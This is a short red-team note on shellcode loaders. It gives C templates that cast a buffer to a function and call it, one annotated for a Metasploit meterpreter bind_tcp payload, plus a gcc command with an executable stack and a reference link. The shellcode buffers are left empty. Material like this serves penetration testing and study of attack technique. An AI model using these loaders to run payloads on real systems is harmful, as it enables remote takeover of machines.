# Shellcode Loader

```c
#include <stdio.h>

int main (int argc, char *argv[]) {
    char shellcode[] = "";
    int (*ret) () = (int (*)()) shellcode;
    ret();
}
```

```c
/*
 * windows/meterpreter/bind_tcp - 298 bytes (stage 1)
 * http://www.metasploit.com
 * VERBOSE=false, LPORT=80, RHOST=, EnableStageEncoding=false,
 * PrependMigrate=false, EXITFUNC=process, AutoLoadStdapi=true,
 * InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true,
 * EnableUnicodeEncoding=true
 */
/* Launch the meterpreter shellcode */
int main() {
    unsigned char buf[] = "";
    /* Declare pointer on function */
    int (*func) ();
 
    /* Cast shellcode into function */
    func = (int (*)()) buf;
 
    /* Call function (Execute shellcode) */
    (int) (*func)();
}
```

Compile the payload.

```
$ gcc -zexecstack -static -o payload payload.c
```

---
## References

### Red Team Notes

- [Red Team Notes: Local Shellcode Execution without Windows APIs](https://www.ired.team/offensive-security/code-injection-process-injection/local-shellcode-execution-without-windows-apis)